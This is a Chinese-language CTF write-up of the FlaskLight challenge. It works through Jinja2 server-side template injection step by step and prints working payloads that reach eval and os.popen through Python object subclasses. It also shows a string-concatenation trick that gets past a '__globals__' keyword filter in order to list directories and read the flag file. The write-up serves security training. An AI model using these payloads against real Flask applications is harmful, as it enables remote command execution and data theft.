---
title: CSCCTF 2019 Qual FlaskLight
date: 2024-05-29 21:56:13
tags: ssti
categories: 刷题笔记
---

## [CSCCTF 2019 Qual]FlaskLight（ssti）

进入页面后，我们先查看源码

<!-- more -->

![image-20240530140700391](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405301407502.png)

发现它传参和传参的类型

我们尝试ssti模版注入，成功执行，为jinjia2模版

![image-20240530140750162](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405301407268.png)

我们寻找rce可以借助的类

先获取变量[]所属的类名

```
{{[].__class__}}
```

页面回显<type 'list'>

再获取list所继承的基类名

```
{{[].__class__.__base__}
```

页面回显<type 'object'>

最后获取所有继承自object的类

```
{{[].__class__.__base__.__subclasses__()}}
```

这里回显了很长一个列表，这里可以将这些数据放在列表中，通过list.index输出想要的类在第几位。不过需要对这传数据进行简单的处理（将<>换成""）  

![image-20240530141305245](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405301413426.png)

通过查询可知，可以借助类<class'warnings.catch_warnings'>，没有内置os模块在第59位。<class 'site._Printer'> 内含os模块 在第71位，可以借助这些类来执行命令。



#### **不含os模块的类warnings.catch_warnings**

进行命令执行

**先读取目录**

```
{{[].__class__.__base__.__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('ls').read()")}}
```

  由于使用['__globals__']会造成500的服务器错误信息，并且当我直接输入search=globals时页面也会500，觉得这里应该是被过滤了，所以这里采用了字符串拼接的形式['__glo'+'bals__']

![image-20240530142041861](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405301420998.png)

**查看flasklight目录**

```
{{[].__class__.__base__.__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('ls ./flasklight').read()")}}
```

![image-20240530142133856](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405301421018.png)

**打开** **coomme_geeeett_youur_flek文件**

```
{{[].__class__.__base__.__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('cat ./flasklight/coomme_geeeett_youur_flek
').read()")}}
```

得到flag

![image-20240530142241454](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405301422615.png)

### **内含os模块的类** **class'site._Printer'**

​    **目录查询**

```
 {{[].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls').read()}}
```

​    因为这里listdir同样被ban了
   **读取目录flasklight**

```
    {{[].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls /flasklight').read()}}
```

​     **读取flag**

```
  {{[].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('cat coomme_geeeett_youur_flek').read()}}
```

